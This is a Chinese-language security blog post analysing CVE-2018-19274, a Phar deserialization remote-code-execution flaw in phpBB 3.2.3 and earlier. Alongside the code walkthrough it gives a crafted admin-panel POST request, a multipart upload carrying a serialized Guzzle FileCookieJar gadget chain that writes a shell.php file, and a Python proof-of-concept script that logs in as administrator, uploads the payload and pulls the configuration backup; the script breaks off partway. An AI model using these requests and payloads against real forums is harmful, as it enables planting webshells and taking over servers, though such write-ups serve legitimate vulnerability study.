<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞一、漏洞简介攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合PHPphar 反序列化进行php对象注入，构造可用的恶意攻击链，获取Webshell。 二、漏洞影响phpBB v3.2.3及以前的版本 三、复现过程漏洞分析先看触发php ph">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞一、漏洞简介攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合PHPphar 反序列化进行php对象注入，构造可用的恶意攻击链，获取Webshell。 二、漏洞影响phpBB v3.2.3及以前的版本 三、复现过程漏洞分析先看触发php ph">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId37.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId39.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId40.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId41.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId42.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId44.png">
<meta property="article:published_time" content="2022-07-08T06:26:01.543Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-PhpBB/（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:01.543Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-19274）PhpBB-Phar反序列化远程代码漏洞"><a href="#（CVE-2018-19274）PhpBB-Phar反序列化远程代码漏洞" class="headerlink" title="（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞"></a>（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合PHP<br>phar 反序列化进行php对象注入，构造可用的恶意攻击链，获取Webshell。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpBB v3.2.3及以前的版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先看触发php phar反序列化漏洞的核心代码如下：</p>
<p>文件位置：<code>phpBB3/includes/functions_acp.php::validate_config_vars</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
<p>通过<code>file_exists</code>函数判断<code>$path</code>是否存在，此处若可以被我们上传PHAR归档包，文件路径若被我们可知可控，就可以通过<code>phar://</code>协议进行反序列化攻击。</p>
<h3 id="触发点分析"><a href="#触发点分析" class="headerlink" title="触发点分析"></a>触发点分析</h3><p>首先是载入的时候调用<code>acp_attachments-&gt;main()</code>方法</p>
<p>文件位置：<code>phpBB3/includes/acp/acp_attachments.php</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="2.png"></p>
<p>关键函数为<code>validate_config_vars</code>函数，第一个参数为<code>$display_vars[&#39;vars&#39;]</code>来自上文的系统配置定义：</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="3.png"></p>
<p>第二个参数通过<code>$_REQUEST</code>接收，post发送数组参数<code>config</code>，被赋值成为<code>$cfg_array</code></p>
<p>两个参数传入<code>validate_config_vars</code>函数，继续跟进。</p>
<p>文件位置：<code>phpBB3/includes/functions_acp.php</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="4.png"></p>
<p>进入函数后使用<code>foreach</code>对<code>$config_vars</code>进行遍历，键名为<code>$config_name</code>，键值为<code>$config_definition</code>。</p>
<p>先对<code>$cfg_array</code>进行判断，也就是post数组中必须有和系统配置数组相同的键名的数组；然后又对键值的判断是否存在<code>$config_definition[&#39;validate&#39;]</code>。两个条件需要同时满足，不满足就跳过此变量循环，存在就对<code>$config_definition[&#39;validate&#39;]</code>进行分割为数组，并取第0个参数传进<code>switch</code>进行匹配，可以发现利用点在<code>wpath</code>分支里：</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="5.png"></p>
<p>满足上文两条件并且<code>$validator[$type]==wpath</code>才能进入分支，对系统配置数组进行筛选，暂时发现只有键名为<code>upload_path</code>的数组满足条件。</p>
<p>但是在进入路径判断前有一个三元运算</p>
<pre><code>$path = in_array($config_definition[&#39;validate&#39;], array(&#39;wpath&#39;, &#39;path&#39;, &#39;rpath&#39;, &#39;rwpath&#39;)) ? $phpbb_root_path . $cfg_array[$config_name] : $cfg_array[$config_name];
</code></pre>
<p>经过判断<code>$config_definition[&#39;validate&#39;]</code>在数组之中，所以会走第一个分支，<code>$cfg_array[$config_name]</code>就是post数组变量，此处可控，但是会和<code>$phpbb_root_path</code>进行拼接。文件位置：<code>phpBB3/adm/index.php</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="6.png"></p>
<p>因此拼接后的<code>$path</code>会变成<code>./../xxxxxxxxxx</code>，路径出错无法利用，如下。</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="7.png"></p>
<p>但是这里的整个<code>switch</code>语句犯了一个较为低级的错误，部分条件的语句段没有使用<code>break</code>进行结束。</p>
<p><code>switch</code>执行方式：开始时没有代码被执行。仅当一个 <code>case</code>语句中的值和<br><code>switch</code>表达式的值匹配时 PHP<br>才开始执行语句，直到<code>switch</code>的程序段结束或者遇到第一个<code>break</code><br>语句为止。如果不在<code>case</code>的语句段最后写上<code>break</code>的话，PHP<br>将继续执行下一个<code>case</code>中的语句段。</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="8.png"></p>
<p>因此需要在<code>$config_vars</code>找到一个元素<code>$config_definition</code>，并且<code>$config_definition[&#39;validate&#39;]</code>等于<code>absolute_path</code>或者<code>absolute_path_writable</code>或者<code>path</code>，这样就能即进入<code>wpath</code>执行也不增加<code>$path</code>的前缀</p>
<p>使用如下代码过滤：</p>
<pre><code>foreach ($display_vars[&#39;vars&#39;] as $key =&gt;$value)&#123;
    if (($value[&#39;validate&#39;] === &#39;absolute_path&#39;) or ($value[&#39;validate&#39;] === &#39;absolute_path_writable&#39;) or ($value[&#39;validate&#39;] === &#39;path&#39;))&#123;
        print(&#39;66&#39;.$key.&#39;77&#39;);
    &#125;
&#125;
</code></pre>
<p>发现<code>img_imagick</code>元素满足条件：</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="9.png"></p>
<p>进入控制面板的附件设定，提交并该修改数据包</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="10.png"></p>
<p>数据包如下，关键点为<code>config[img_imagick]</code>参数：</p>
<pre><code>POST /phpBB3/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=385d5172c29a3a9530d6b467a5691ffd HTTP/1.1
Host: www.0-sec.org
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 967

config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D=phar://../files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part/&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token=0910a5dc9a13fc50a0ead4656617642fa80daaf1
</code></pre>
<p>此时已经可以触发反序列化，还需上传包含利用链的恶意附件。</p>
<h3 id="上传恶意附件"><a href="#上传恶意附件" class="headerlink" title="上传恶意附件"></a>上传恶意附件</h3><p>上传位置为前台发帖附件处:</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId37.png" alt="11.png"></p>
<p>处理文件上传的关键函数，以及函数调用栈：</p>
<p>文件位置：<code>phpBB3/phpbb/plupload/plupload.php</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId38.png" alt="12.png"></p>
<p>在这里函数handle_upload可以实现多个<code>chunk</code>处理。<code>$this-&gt;request-&gt;variable</code>函数根据键名从请求中获取值，首先获取<code>chunks</code>的值，并判断<code>chunk</code>是否小于2，如果小于就直接返回，如果大于就开始进行多<code>chunk</code>处理。</p>
<p>然后进入关键的<code>temporary_filepath</code>函数：</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId39.png" alt="13.png"></p>
<p>这个就是计算上传文件路径的函数，<code>$this-&gt;temporary_directory</code>可知为<code>./files/plupload</code>，<code>$file_name</code>可控，<code>\phpbb\files\filespec::get_extension($file_name)</code>获取文件的后缀同样可控，比较麻烦的是<code>$this-&gt;config[&#39;plupload_salt&#39;]</code>存在于数据库中，但可以在管理面板中通过备份进行获取。</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId40.png" alt="14.png"></p>
<p><code>plupload_salt</code>如下</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId41.png" alt="15.png"></p>
<p>此时已经完全可以计算路径</p>
<pre><code>./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip
</code></pre>
<p>然后进入函数进行文件写入</p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId42.png" alt="16.png"></p>
<p>中途会产生一个临时文件，但后面会删除，最后文件名还会增加<code>.part</code>后缀。</p>
<pre><code>./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part
</code></pre>
<p>攻击数据包如下：</p>
<pre><code>POST /phpBB3/posting.php?mode=post&amp;f=2&amp;sid=a3f8b226bd4ad508d8838284c0cfc332 HTTP/1.1
Host: www.0-sec.org
Content-Length: 1909
Origin: http://bugtest.com
x-requested-with: XMLHttpRequest
x-phpbb-using-plupload: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuHMhmTMPyBMwbiEg
Accept: */*
Referer: http://bugtest.com/phpBB3/posting.php?mode=post&amp;f=2&amp;sid=52c63bf06fdeaef60de9b8fba1de97ad
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;name&quot;

rai4over.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;chunk&quot;

0
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;chunks&quot;

3
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;add_file&quot;

Add the file
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;real_filename&quot;

payload.phar.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][attach_id]&quot;

16
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][is_orphan]&quot;

1
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][real_filename]&quot;

payload.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][attach_comment]&quot;


------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][filesize]&quot;

35802
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;fileupload&quot;; filename=&quot;payload.phar.zip&quot;
Content-Type: application/zip

&lt;?php __HALT_COMPILER(); ?&gt;
ÕO:31:&quot;GuzzleHttp\Cookie\FileCookieJar&quot;:4:&#123;s:41:&quot;GuzzleHttp\Cookie\FileCookieJarfilename&quot;;s:42:&quot;/Applications/MAMP/htdocs/phpBB3/shell.php&quot;;s:52:&quot;GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies&quot;;b:1;s:36:&quot;GuzzleHttp\Cookie\CookieJarcookies&quot;;a:1:&#123;i:0;O:27:&quot;GuzzleHttp\Cookie\SetCookie&quot;:1:&#123;s:33:&quot;GuzzleHttp\Cookie\SetCookiedata&quot;;a:3:&#123;s:7:&quot;Expires&quot;;i:1;s:7:&quot;Discard&quot;;b:0;s:5:&quot;Value&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;&#125;&#125;s:39:&quot;GuzzleHttp\Cookie\CookieJarstrictMode&quot;;N;&#125;test.txtöì\~Ø¶test¨~ê÷z]©äg­4GBMB
------WebKitFormBoundaryuHMhmTMPyBMwbiEg--
</code></pre>
<p>至此我们已经对上传文件路径内容可知可控，还恶意文件中的利用链。</p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>利用PHP网络请求插件Guzzle完成反序列化利用。</p>
<p>文件位置：<code>phpBB3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p>
<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId44.png" alt="17.png"></p>
<p>析构函数调用<code>save</code>函数，最后使用<code>file_put_contents</code>完成文件写入，整个漏洞利用完成。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code># coding =utf-8

import requests
from bs4 import BeautifulSoup
import re

proxies = &#123;
    &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,
&#125;

import hashlib


def md5(str):
    m = hashlib.md5()
    m.update(str.encode(&quot;utf8&quot;))
    return m.hexdigest()


if __name__ == &#39;__main__&#39;:
    target = &quot;http://bugtest.com/phpBB3&quot;
    admin_account = &#39;admin&#39;
    admin_pwd = &#39;123456&#39;
    phar_payload = &#39;payload.phar.zip&#39;
    upfilename = &#39;rai4over.zip&#39;

    r = requests.Session()
    data = &#123;
        &#39;username&#39;: admin_account,
        &#39;password&#39;: admin_pwd,
        &#39;login&#39;: &#39;Login&#39;
    &#125;
    print(&#39;Start logging in to the administrator account&#39;)
    rs = r.post(target + &#39;/ucp.php?mode=login&#39;, data=data)
    html = rs.text

    if (&#39;header-profile dropdown-container&#39; in html) and (&quot;class=\&quot;username-coloured\&quot;&gt;&quot; + admin_account in html):
        print(&#39;OK! The administrator account is successfully logged in&#39;)
    else:
        exit(&#39;No! Login failed . Probably because of the verification code&#39;)

    soup = BeautifulSoup(html, &quot;html.parser&quot;)
    input = soup.find(&#39;input&#39;, attrs=&#123;&#39;name&#39;: &#39;sid&#39;&#125;)
    sid = input[&#39;value&#39;]

    file = &#123;
        &#39;fileupload&#39;: open(phar_payload, &quot;rb&quot;).read()

    &#125;
    data = &#123;
        &#39;name&#39;: upfilename,
        &#39;chunk&#39;: 0,
        &#39;chunks&#39;: 3,
        &#39;add_file&#39;: &#39;Add the file&#39;,
        &#39;real_filename&#39;: &#39;payload.phar.zip&#39;
    &#125;
    rs = r.post(target + &#39;/posting.php?mode=post&amp;f=2&amp;sid=&#39; + sid, files=file, data=data)
    if &#39;jsonrpc&#39; not in rs.text:
        exit(&#39;Upload fail&#39;)
    else:
        print(&#39;Uploading malicious file successfully&#39;)

    Admin_Control = target + &#39;/adm/index.php?sid=&#39; + sid
    print(&quot;Get Administration Control Panel URL ：&quot; + Admin_Control)

    rs = r.get(Admin_Control)
    html = rs.text
    soup = BeautifulSoup(html, &quot;html.parser&quot;)
    input = soup.find(&#39;input&#39;, attrs=&#123;&#39;type&#39;: &#39;password&#39;&#125;)
    passwd_id = input[&#39;id&#39;]
    credential = soup.find(&#39;input&#39;, attrs=&#123;&#39;name&#39;: &#39;credential&#39;&#125;)
    credential = credential[&#39;value&#39;]
    data = &#123;
        &#39;username&#39;: admin_account,
        passwd_id: admin_pwd,
        &#39;login&#39;: &#39;Login&#39;,
        &#39;redirect&#39;: &#39;./../adm/index.php&#39;,
        &#39;credential&#39;: credential
    &#125;
    rs = r.post(target + &#39;/adm/index.php?sid=&#39; + sid, data=data)
    html = rs.text
    if &#39;&lt;title&gt;ACP index&lt;/title&gt;&#39; in html:
        print(&#39;Administration Control Panel login successful&#39;)

    soup = BeautifulSoup(html, &quot;html.parser&quot;)
    div = soup.find(&#39;div&#39;, attrs=&#123;&#39;id&#39;: &#39;page-header&#39;&#125;)
    sid = div.a[&#39;href&#39;][-32:]

    rs = r.get(target + &#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;sid=&#39; + sid)
    html = rs.text
    soup = BeautifulSoup(html, &quot;html.parser&quot;)
    input = soup.find(&#39;input&#39;, attrs=&#123;&#39;name&#39;: &#39;form_token&#39;&#125;)
    form_token = input[&#39;value&#39;]
    input = soup.find(&#39;input&#39;, attrs=&#123;&#39;name&#39;: &#39;creation_time&#39;&#125;)
    creation_time = input[&#39;value&#39;]

    data = &quot;type=data&amp;method=text&amp;where=download&amp;table%5B%5D=phpbb_config&amp;submit=Submit&amp;creation_time=&#123;creation_time&#125;&amp;form_token=&#123;form_token&#125;&quot;.format(
        creation_time=creation_time, form_token=form_token)
    rs = r.post(target + &#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;action=download&amp;sid=&#39; + sid, data=data,
                headers=&#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Connection&quot;: &quot;close&quot;,
                         &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;&#125;)
    html = rs.text
